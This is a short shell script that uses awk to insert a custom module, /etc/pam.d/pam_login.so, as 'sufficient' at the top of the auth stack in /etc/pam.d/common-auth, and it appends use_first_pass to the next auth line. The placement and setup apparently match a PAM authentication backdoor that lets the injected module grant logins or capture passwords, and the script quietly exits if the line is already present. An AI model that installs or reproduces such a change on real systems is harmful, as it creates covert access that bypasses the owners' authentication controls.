#!/bin/sh

PAM_FILE="/etc/pam.d/common-auth"
CUSTOM_LINE='auth    sufficient                      /etc/pam.d/pam_login.so'

# Exit if already present
grep -qF "$CUSTOM_LINE" "$PAM_FILE" && exit 0

awk -v insert_line="$CUSTOM_LINE" '
BEGIN { inserted = 0 }
{
    if (!inserted && $1 == "auth" && $0 !~ /^#/) {
        print insert_line
        if ($0 !~ /use_first_pass/) {
            $0 = $0 " use_first_pass"
        }
        inserted = 1
    }
    print
}
' "$PAM_FILE" > "$PAM_FILE.new" && mv "$PAM_FILE.new" "$PAM_FILE"
